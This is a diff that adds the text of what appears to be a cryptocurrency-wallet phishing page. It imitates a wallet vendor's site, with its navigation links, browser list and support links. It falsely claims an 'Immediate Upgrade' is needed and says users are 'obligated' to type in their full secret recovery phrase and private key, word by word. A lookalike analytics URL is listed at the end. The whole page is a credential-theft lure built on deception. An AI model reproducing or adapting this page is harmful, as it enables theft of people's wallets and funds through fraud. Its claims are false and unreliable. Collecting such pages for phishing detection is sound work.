@@ -1,0 +1,26 @@
+Confirm Secret Recovery Phrase
+Support
+Feature
+Wallets
+Immediate Upgrade Needed in your wallet
+Secret Recovery Phrase
+Private Key
+Confirm Secret Recovery Phrase
+To keep your wallet secure you will be obligated to restore your passphrase. Fill in your passphrase completely.
+Fill each word in the order it was presented to you.
+Verify Phrases
+Supported Browsers
+Chrome
+Brave
+Developers
+Download
+Documentation
+Open Positions
+Swag Shop
+Contact Us
+Support
+Privacy Policy
+Contributor License Agreement
+
+URLs:
+https://mysafumatemesk.matomo.cloud/
